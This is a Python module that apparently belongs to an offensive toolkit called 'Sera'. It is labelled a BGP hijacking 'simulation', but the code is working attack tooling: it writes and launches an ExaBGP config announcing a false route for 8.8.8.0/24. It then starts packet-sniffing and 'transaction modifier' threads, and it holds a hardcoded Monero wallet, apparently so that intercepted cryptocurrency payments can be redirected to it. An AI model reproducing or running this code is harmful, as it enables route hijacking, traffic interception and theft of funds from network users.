#!/usr/bin/env python3
"""
bgp_hijack_high.py - High-level BGP hijacking MITM simulation
MERGED FROM JULIUS → SERA PLATFORM
"""

import subprocess
import time
import os
import sys
import json
import threading
import logging
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, Any

# Add Sera paths
SERA_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(SERA_ROOT))

# Sera-specific imports
try:
    from config import settings
    SERA_CONFIG = settings
except ImportError:
    SERA_CONFIG = None

# Setup Sera logging
LOG_DIR = SERA_ROOT / "logs"
LOG_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / 'sera_bgp_hijack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("sera_bgp_hijack")

class SeraBGPHijack:
    """BGP Hijacking with Sera integration"""
    
    def __init__(self):
        self.running = False
        self.processes = []
        self.hijack_history = []
        self.current_hijack = None
        
        # Sera components
        self.db = self._init_database()
        self.auth = self._init_auth()
        self.audit = self._init_audit()
        
        # Default config
        self.target_prefix = "8.8.8.0/24"
        self.next_hop = "10.0.0.1"
        self.interface = "eth0"
        self.test_wallet = "47SuVgVRZkQaVW3TauHdKCKVB7ynhtWzsARE9tesy2mYQrKSg2ErUibcx8okZFPkxYbVcsBCZsK1HAH3mci4uNA198NCpTG"
        self.wallet_type = "monero"
        
        self.load_config()
        logger.info("Sera BGP Hijack initialized")
    
    def _init_database(self):
        """Initialize Sera database"""
        try:
            from database.db import get_db
            return get_db()
        except ImportError:
            logger.warning("Database not available - using memory storage")
            return None
    
    def _init_auth(self):
        """Initialize Sera authentication"""
        try:
            from security.auth import get_current_user
            return get_current_user
        except ImportError:
            logger.warning("Auth not available - development mode")
            return None
    
    def _init_audit(self):
        """Initialize Sera audit logging"""
        try:
            from services.audit_service import log_activity
            return log_activity
        except ImportError:
            logger.warning("Audit service not available - using local logging")
            return None
    
    def load_config(self):
        """Load configuration from Sera config"""
        if SERA_CONFIG:
            bgp_config = getattr(SERA_CONFIG, 'bgp_mitm', {})
            self.target_prefix = bgp_config.get('target_prefix', self.target_prefix)
            self.next_hop = bgp_config.get('next_hop', self.next_hop)
            self.interface = bgp_config.get('interface', self.interface)
            self.test_wallet = bgp_config.get('test_wallet', self.test_wallet)
            self.wallet_type = bgp_config.get('wallet_type', self.wallet_type)
        else:
            # Try loading from config.json
            config_file = SERA_ROOT / "config.json"
            if config_file.exists():
                try:
                    with open(config_file, "r") as f:
                        config = json.load(f)
                        bgp_config = config.get("bgp_mitm", {})
                        self.target_prefix = bgp_config.get("target_prefix", self.target_prefix)
                        self.next_hop = bgp_config.get("next_hop", self.next_hop)
                        self.interface = bgp_config.get("interface", self.interface)
                        self.test_wallet = bgp_config.get("test_wallet", self.test_wallet)
                        self.wallet_type = bgp_config.get("wallet_type", self.wallet_type)
                except Exception as e:
                    logger.warning(f"Could not load config.json: {e}")
    
    def inject_bgp_route(self) -> bool:
        """Inject false BGP route using ExaBGP"""
        logger.info(f"[+] Injecting false BGP route: {self.target_prefix} -> {self.next_hop}")
        try:
            exabgp_conf = f"""
neighbor 10.0.0.1 {{
    router-id 10.0.0.2;
    local-as 65001;
    peer-as 65000;
    static {{
        route {self.target_prefix} next-hop {self.next_hop};
    }}
}}
"""
            conf_path = LOG_DIR / "exabgp_hijack.conf"
            with open(conf_path, "w") as f:
                f.write(exabgp_conf)
            
            process = subprocess.Popen(
                ["exabgp", str(conf_path)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(process)
            logger.info("[+] ExaBGP process started")
            return True
        except Exception as e:
            logger.error(f"ExaBGP injection failed: {e}")
            return False
    
    def start_mitm(self) -> bool:
        """Start MITM interception"""
        logger.info("[+] Starting MITM interception...")
        try:
            from .packet_sniffer import start_sniffer
            from .transaction_modifier import start_modifier
            
            sniffer_thread = threading.Thread(
                target=start_sniffer,
                args=(self.interface, None),
                daemon=True
            )
            sniffer_thread.start()
            self.processes.append(sniffer_thread)
            
            modifier_thread = threading.Thread(
                target=start_modifier,
                args=(self.interface,),
                daemon=True
            )
            modifier_thread.start()
            self.processes.append(modifier_thread)
            
            logger.info("[+] MITM interception started")
            return True
        except Exception as e:
            logger.error(f"MITM start failed: {e}")
            return False
    
    def run_full_hijack(self, user_id: Optional[str] = None) -> Dict[str, Any]:
        """Run full BGP hijack simulation"""
        logger.info("=" * 60)
        logger.info("BGP HIJACK - HIGH LEVEL SIMULATION")
        logger.info(f"Target Prefix: {self.target_prefix}")
        logger.info(f"Next Hop: {self.next_hop}")
        logger.info(f"Interface: {self.interface}")
        logger.info(f"Wallet Type: {self.wallet_type}")
        logger.info(f"Wallet: {self.test_wallet[:20]}...")
        logger.info("=" * 60)
        
        # Store hijack info
        self.current_hijack = {
            "target_prefix": self.target_prefix,
            "next_hop": self.next_hop,
            "interface": self.interface,
            "wallet_type": self.wallet_type,
            "started_at": datetime.now().isoformat(),
            "user_id": user_id or "system",
            "status": "starting"
        }
        
        # Audit log
        self._log_hijack_start()
        
        if not self.inject_bgp_route():
            logger.error("[!] BGP injection failed")
            self.current_hijack["status"] = "failed"
            return {"status": "failed", "error": "BGP injection failed"}
        
        time.sleep(2)
        
        if not self.start_mitm():
            logger.error("[!] MITM interception failed")
            self.current_hijack["status"] = "failed"
            return {"status": "failed", "error": "MITM failed"}
        
        self.running = True
        self.current_hijack["status"] = "running"
        self.hijack_history.append(self.current_hijack)
        
        logger.info("[+] BGP hijack simulation running. Press Ctrl+C to stop.")
        return {"status": "running", "target": self.target_prefix, "next_hop": self.next_hop}
    
    def stop_hijack(self) -> Dict[str, Any]:
        """Stop BGP hijack simulation"""
        logger.info("[+] Stopping BGP hijack simulation...")
        
        for p in self.processes:
            try:
                p.terminate()
            except:
                pass
        
        self.running = False
        self.processes = []
        
        if self.current_hijack:
            self.current_hijack["status"] = "stopped"
            self.current_hijack["stopped_at"] = datetime.now().isoformat()
            self._log_hijack_stop()
        
        logger.info("[+] Simulation stopped")
        return {"status": "stopped"}
    
    def _log_hijack_start(self):
        """Log hijack start to Sera audit"""
        try:
            if self.audit:
                self.audit(
                    action="bgp_hijack_start",
                    target=self.target_prefix,
                    details=self.current_hijack
                )
            else:
                audit_file = LOG_DIR / f"bgp_hijack_{datetime.now().strftime('%Y%m%d')}.log"
                with open(audit_file, 'a') as f:
                    f.write(json.dumps({
                        "action": "start",
                        "target_prefix": self.target_prefix,
                        "timestamp": self.current_hijack["started_at"]
                    }) + '\n')
        except Exception as e:
            logger.error(f"Error logging hijack start: {e}")
    
    def _log_hijack_stop(self):
        """Log hijack stop to Sera audit"""
        try:
            if self.audit:
                self.audit(
                    action="bgp_hijack_stop",
                    target=self.target_prefix,
                    details=self.current_hijack
                )
        except Exception as e:
            logger.error(f"Error logging hijack stop: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get hijack status"""
        return {
            "is_running": self.running,
            "current_hijack": self.current_hijack,
            "total_hijacks": len(self.hijack_history),
            "target_prefix": self.target_prefix
        }

# Singleton
_hijack_instance = None

def get_hijack_instance() -> SeraBGPHijack:
    global _hijack_instance
    if _hijack_instance is None:
        _hijack_instance = SeraBGPHijack()
    return _hijack_instance

# Sera API Functions
def run_high_hijack(user_id: Optional[str] = None) -> Dict[str, Any]:
    hijack = get_hijack_instance()
    return hijack.run_full_hijack(user_id)

def stop_high_hijack() -> Dict[str, Any]:
    hijack = get_hijack_instance()
    return hijack.stop_hijack()

def get_hijack_status() -> Dict[str, Any]:
    hijack = get_hijack_instance()
    return {"status": "success", "data": hijack.get_status()}

if __name__ == "__main__":
    print("Sera BGP Hijack loaded")